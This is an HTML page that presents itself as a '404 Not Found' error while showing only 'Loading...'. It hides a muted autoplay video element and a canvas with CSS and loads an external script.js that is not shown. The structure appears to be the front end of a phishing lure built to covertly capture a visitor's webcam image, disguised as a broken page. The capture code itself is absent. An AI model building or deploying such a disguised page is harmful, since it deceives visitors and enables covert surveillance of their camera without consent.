<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { background-color: #ffffff; color: #000000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial', sans-serif; }
        video, canvas, img { display: none; }
        .loading { font-size: 14px; text-align: center; }
    </style>
</head>
<body>
    <div class="loading">
        <p>Loading...</p>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <script src="script.js"></script>
</body>
</html>
